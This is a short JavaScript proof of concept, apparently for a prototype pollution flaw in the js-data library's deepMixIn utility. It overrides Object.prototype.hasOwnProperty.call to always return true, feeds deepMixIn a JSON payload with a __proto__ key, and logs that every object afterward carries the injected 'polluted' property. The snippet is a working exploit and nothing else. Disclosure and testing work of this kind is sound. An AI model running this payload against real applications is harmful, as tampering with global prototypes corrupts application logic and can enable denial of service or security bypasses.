Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepMixIn({}, source);
console.log({}.polluted);